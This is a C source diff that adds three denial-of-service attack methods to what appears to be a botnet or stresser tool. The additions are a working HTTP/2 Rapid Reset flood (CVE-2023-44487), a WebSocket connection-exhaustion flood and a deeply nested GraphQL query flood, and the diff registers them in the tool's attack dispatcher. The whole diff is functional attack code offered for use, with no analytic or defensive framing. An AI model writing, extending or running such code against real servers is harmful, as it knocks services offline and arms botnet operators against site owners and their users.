@@ -750,6 +750,266 @@ static void *http_proxy_worker(void *arg) {
     return NULL;
 }
 
+/* H2RAPID — HTTP/2 Rapid Reset attack (CVE-2023-44487).
+ * Connect HTTP/2, send SETTINGS + HEADERS frame, immediately RST_STREAM.
+ * Server does full stream setup + teardown = CPU exhaustion.
+ * One connection = thousands of "requests" via rapid stream open/close. */
+#define H2_POOL 256
+static void *h2rapid_worker(void *arg) {
+    MegaThread *mt = (MegaThread *)arg;
+    int ncpu = get_nprocs(); if (ncpu < 1) ncpu = 1;
+    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(mt->cpu_id % ncpu, &cs);
+    pthread_setaffinity_np(pthread_self(), sizeof(cs), &cs);
+
+    SSL_CTX *ctx = SSL_CTX_new(TLS_client_method());
+    if (!ctx) return NULL;
+    SSL_CTX_set_verify(ctx, SSL_VERIFY_NONE, NULL);
+    SSL_CTX_set_alpn_protos(ctx, (const unsigned char *)"\x02h2", 3);
+
+    time_t start = time(NULL);
+    unsigned int seed = (unsigned int)time(NULL) ^ (unsigned int)(uintptr_t)pthread_self();
+    struct sockaddr_in ta = mt->target;
+
+    while (time(NULL) - start < mt->duration && !is_attack_stop()) {
+        int us = should_throttle();
+        if (us > 0) { usleep((unsigned)us); continue; }
+
+        int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+        if (s < 0) { usleep(1000); continue; }
+        int fl = 1;
+        setsockopt(s, IPPROTO_TCP, TCP_NODELAY, &fl, sizeof(fl));
+        if (tcp_connect_wait(s, &ta, 2000) < 0) { close(s); continue; }
+
+        SSL *ssl = SSL_new(ctx);
+        if (!ssl) { close(s); continue; }
+        SSL_set_fd(ssl, s);
+        SSL_set_tlsext_host_name(ssl, mt->host);
+        if (SSL_connect(ssl) != 1) { SSL_free(ssl); close(s); continue; }
+
+        /* HTTP/2 connection preface (24 bytes) */
+        static const unsigned char preface[] = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
+        SSL_write(ssl, preface, sizeof(preface) - 1);
+
+        /* SETTINGS frame: type=4, flags=0, stream=0, length=0 */
+        static const unsigned char settings[] = {0x00,0x00,0x00,0x04,0x00,0x00,0x00,0x00,0x00};
+        SSL_write(ssl, settings, sizeof(settings));
+        /* ACK SETTINGS */
+        static const unsigned char settings_ack[] = {0x00,0x00,0x00,0x04,0x01,0x00,0x00,0x00,0x00};
+        SSL_write(ssl, settings_ack, sizeof(settings_ack));
+
+        /* Rapid: open many streams with HEADERS + immediate RST_STREAM */
+        for (int i = 0; i < 1000 && !is_attack_stop(); i++) {
+            uint32_t sid = (uint32_t)((i + 1) * 2); /* client streams are odd */
+            unsigned char buf[64];
+            int off = 0;
+            /* HEADERS frame: type=1, flags=4 (END_HEADERS), stream=sid */
+            /* Minimal HEADERS with :method GET, :path /, :authority host */
+            static const unsigned char hp[] = {
+                0x82, /* :method GET */
+                0x84, /* :path / */
+                0x86, /* :scheme https */
+                0x41, 0x06, 'b','o','t','x','y','z', /* :authority botxyz */
+            };
+            uint32_t flen = sizeof(hp);
+            buf[off++] = (unsigned char)((flen >> 16) & 0xFF);
+            buf[off++] = (unsigned char)((flen >> 8) & 0xFF);
+            buf[off++] = (unsigned char)(flen & 0xFF);
+            buf[off++] = 0x01; /* type HEADERS */
+            buf[off++] = 0x04; /* END_HEADERS */
+            buf[off++] = (unsigned char)((sid >> 24) & 0xFF);
+            buf[off++] = (unsigned char)((sid >> 16) & 0xFF);
+            buf[off++] = (unsigned char)((sid >> 8) & 0xFF);
+            buf[off++] = (unsigned char)(sid & 0xFF);
+            memcpy(buf + off, hp, flen); off += flen;
+            SSL_write(ssl, buf, off);
+
+            /* RST_STREAM: type=3, flags=0, stream=sid, error=0 (NO_ERROR) */
+            unsigned char rst[9] = {0x00,0x00,0x04,0x03,0x00};
+            rst[5] = (unsigned char)((sid >> 24) & 0xFF);
+            rst[6] = (unsigned char)((sid >> 16) & 0xFF);
+            rst[7] = (unsigned char)((sid >> 8) & 0xFF);
+            rst[8] = (unsigned char)(sid & 0xFF);
+            SSL_write(ssl, rst, 9);
+            pkt_sent(2);
+
+            if ((i & 63) == 63) sched_yield();
+        }
+        /* GOAWAY */
+        static const unsigned char goaway[] = {0x00,0x00,0x08,0x07,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
+        SSL_write(ssl, goaway, sizeof(goaway));
+        SSL_free(ssl);
+        close(s);
+        sched_yield();
+    }
+    SSL_CTX_free(ctx);
+    return NULL;
+}
+
+/* WSFLOOD — Open many WebSocket connections, spam small frames.
+ * Server's WebSocket handler allocates per-connection state → memory exhaustion. */
+#define WSF_POOL 512
+static void *wsflood_worker(void *arg) {
+    MegaThread *mt = (MegaThread *)arg;
+    int ncpu = get_nprocs(); if (ncpu < 1) ncpu = 1;
+    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(mt->cpu_id % ncpu, &cs);
+    pthread_setaffinity_np(pthread_self(), sizeof(cs), &cs);
+
+    SSL_CTX *ctx = SSL_CTX_new(TLS_client_method());
+    if (!ctx) return NULL;
+    SSL_CTX_set_verify(ctx, SSL_VERIFY_NONE, NULL);
+
+    time_t start = time(NULL);
+    unsigned int seed = (unsigned int)time(NULL) ^ (unsigned int)(uintptr_t)pthread_self();
+    int socks[WSF_POOL];
+    SSL *ssls[WSF_POOL];
+    int pool = 0;
+
+    while (time(NULL) - start < mt->duration && !is_attack_stop()) {
+        int us = should_throttle();
+        if (us > 0) { usleep((unsigned)us); continue; }
+
+        /* Fill pool with WebSocket connections */
+        while (pool < WSF_POOL && !is_attack_stop()) {
+            int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+            if (s < 0) break;
+            int fl = 1;
+            setsockopt(s, IPPROTO_TCP, TCP_NODELAY, &fl, sizeof(fl));
+            if (tcp_connect_wait(s, &mt->target, 2000) < 0) { close(s); continue; }
+
+            SSL *ssl = SSL_new(ctx);
+            if (!ssl) { close(s); continue; }
+            SSL_set_fd(ssl, s);
+            SSL_set_tlsext_host_name(ssl, mt->host);
+            if (SSL_connect(ssl) != 1) { SSL_free(ssl); close(s); continue; }
+
+            /* WebSocket upgrade handshake */
+            char ws_key[32];
+            snprintf(ws_key, sizeof(ws_key), "bot%d%d", rand_r(&seed) % 99999, pool);
+            char req[512];
+            snprintf(req, sizeof(req),
+                "GET / HTTP/1.1\r\nHost: %s\r\nUpgrade: websocket\r\n"
+                "Connection: Upgrade\r\nSec-WebSocket-Key: %s\r\n"
+                "Sec-WebSocket-Version: 13\r\n\r\n",
+                mt->host, ws_key);
+            SSL_write(ssl, req, (int)strlen(req));
+
+            socks[pool] = s;
+            ssls[pool] = ssl;
+            pool++;
+            pkt_sent(128);
+        }
+
+        /* Spam small text frames on each connection */
+        for (int i = 0; i < pool && !is_attack_stop(); i++) {
+            /* WebSocket text frame: FIN=1, opcode=1, mask=1, len=4, mask, data */
+            unsigned char frame[10];
+            unsigned char mask[4] = {0x12, 0x34, 0x56, 0x78};
+            frame[0] = 0x81; /* FIN + text */
+            frame[1] = 0x84; /* mask=1, len=4 */
+            memcpy(frame + 2, mask, 4);
+            frame[6] = 'X' ^ mask[0];
+            frame[7] = 'X' ^ mask[1];
+            frame[8] = 'X' ^ mask[2];
+            frame[9] = 'X' ^ mask[3];
+            SSL_write(ssls[i], frame, 10);
+            pkt_sent(10);
+        }
+
+        /* Reap dead */
+        struct pollfd pfds[WSF_POOL];
+        for (int i = 0; i < pool; i++) { pfds[i].fd = socks[i]; pfds[i].events = POLLERR | POLLHUP; }
+        if (poll(pfds, (nfds_t)pool, 100) > 0) {
+            int w = 0;
+            for (int i = 0; i < pool; i++) {
+                if (pfds[i].revents & (POLLERR | POLLHUP)) { SSL_free(ssls[i]); close(socks[i]); }
+                else { if (w != i) { socks[w] = socks[i]; ssls[w] = ssls[i]; } w++; }
+            }
+            pool = w;
+        }
+        sched_yield();
+    }
+    for (int i = 0; i < pool; i++) { SSL_free(ssls[i]); close(socks[i]); }
+    SSL_CTX_free(ctx);
+    return NULL;
+}
+
+/* GRAPHQL — Send deeply nested GraphQL queries to cause CPU/memory explosion.
+ * {a{b{c{...100 levels}}}} → server parser + resolver exponential blowup. */
+#define GQL_POOL 128
+static void *graphql_worker(void *arg) {
+    MegaThread *mt = (MegaThread *)arg;
+    int ncpu = get_nprocs(); if (ncpu < 1) ncpu = 1;
+    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(mt->cpu_id % ncpu, &cs);
+    pthread_setaffinity_np(pthread_self(), sizeof(cs), &cs);
+
+    SSL_CTX *ctx = SSL_CTX_new(TLS_client_method());
+    if (!ctx) return NULL;
+    SSL_CTX_set_verify(ctx, SSL_VERIFY_NONE, NULL);
+
+    /* Build deeply nested GraphQL query: 200 levels */
+    char query[8192];
+    int ql = 0;
+    ql += snprintf(query + ql, sizeof(query) - ql, "{");
+    for (int i = 0; i < 200 && ql < (int)sizeof(query) - 32; i++) {
+        ql += snprintf(query + ql, sizeof(query) - ql, "user{");
+    }
+    ql += snprintf(query + ql, sizeof(query) - ql, "id name");
+    for (int i = 0; i < 200 && ql < (int)sizeof(query) - 8; i++) {
+        ql += snprintf(query + ql, sizeof(query) - ql, "}");
+    }
+    ql += snprintf(query + ql, sizeof(query) - ql, "}");
+
+    time_t start = time(NULL);
+    unsigned int seed = (unsigned int)time(NULL) ^ (unsigned int)(uintptr_t)pthread_self();
+    struct sockaddr_in ta = mt->target;
+
+    while (time(NULL) - start < mt->duration && !is_attack_stop()) {
+        int us = should_throttle();
+        if (us > 0) { usleep((unsigned)us); continue; }
+
+        for (int c = 0; c < 32 && !is_attack_stop(); c++) {
+            int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+            if (s < 0) continue;
+            int fl = 1;
+            setsockopt(s, IPPROTO_TCP, TCP_NODELAY, &fl, sizeof(fl));
+            if (tcp_connect_wait(s, &ta, 2000) < 0) { close(s); continue; }
+
+            SSL *ssl = SSL_new(ctx);
+            if (!ssl) { close(s); continue; }
+            SSL_set_fd(ssl, s);
+            SSL_set_tlsext_host_name(ssl, mt->host);
+            if (SSL_connect(ssl) != 1) { SSL_free(ssl); close(s); continue; }
+
+            /* Try common GraphQL endpoints */
+            const char *paths[] = {"/graphql", "/api/graphql", "/query", "/api/query", "/gql"};
+            const char *path = paths[rand_r(&seed) % 5];
+
+            char req[9216];
+            int rl = snprintf(req, sizeof(req),
+                "POST %s HTTP/1.1\r\n"
+                "Host: %s\r\n"
+                "Content-Type: application/json\r\n"
+                "User-Agent: Mozilla/5.0\r\n"
+                "Connection: close\r\n"
+                "Content-Length: %d\r\n\r\n"
+                "{\"query\":\"%s\"}",
+                path, mt->host, (int)strlen(query) + 11, query);
+            SSL_write(ssl, req, rl);
+            pkt_sent(rl);
+
+            /* Drain response briefly */
+            char rbuf[1024];
+            struct pollfd pfd = { .fd = s, .events = POLLIN };
+            if (poll(&pfd, 1, 500) > 0) SSL_read(ssl, rbuf, sizeof(rbuf));
+            SSL_free(ssl);
+            close(s);
+        }
+        sched_yield();
+    }
+    SSL_CTX_free(ctx);
+    return NULL;
+}
+
 static void *dispatch_worker(void *arg) {
     MegaThread *mt = (MegaThread *)arg;
     switch (mt->cpu_id) {
@@ -759,6 +1019,9 @@ static void *dispatch_worker(void *arg) {
     case -6: return mega_tcp_worker(arg);
     case -7: return http_proxy_worker(arg);
     case -8: return game_worker(arg);
+    case -9: return h2rapid_worker(arg);
+    case -10: return wsflood_worker(arg);
+    case -11: return graphql_worker(arg);
     default: return udp_worker(arg);
     }
 }
@@ -821,7 +1084,11 @@ void *bg_attack_thread(void *arg)
     int is_tls   = atk->tls_exhaust || !strcmp(nm, "TLS_EXHAUST") || !strcmp(nm, "TLS");
     int is_http  = !strcmp(nm, "HTTP");
     int is_slow  = atk->slowloris || !strcmp(nm, "SLOWLORIS");
-    if (!is_mega && !is_udp && !is_game && !is_proxy && !is_tls && !is_http && !is_slow) {
+    int is_h2    = !strcmp(nm, "H2RAPID");
+    int is_wsf   = !strcmp(nm, "WSFLOOD");
+    int is_gql   = !strcmp(nm, "GRAPHQL");
+    if (!is_mega && !is_udp && !is_game && !is_proxy && !is_tls && !is_http &&
+        !is_slow && !is_h2 && !is_wsf && !is_gql) {
         fprintf(stderr, "[atk] unknown method '%s', abort\n", nm);
         set_attack_active(0);
         free(ctx);
@@ -948,6 +1215,9 @@ void *bg_attack_thread(void *arg)
         else if (is_mega) { tag = -6; label = "MEGA TCP"; }
         else if (is_proxy){ tag = -7; label = "HTTP_PROXY"; }
         else if (is_game) { tag = -8; label = "GAME"; }
+        else if (is_h2)   { tag = -9; label = "H2RAPID"; }
+        else if (is_wsf)  { tag = -10; label = "WSFLOOD"; }
+        else if (is_gql)  { tag = -11; label = "GRAPHQL"; }
         else              { tag = 0;  label = "UDP"; }
 
         fprintf(stderr, "[atk] %s target=%s:%d dur=%ds workers=%d\n",
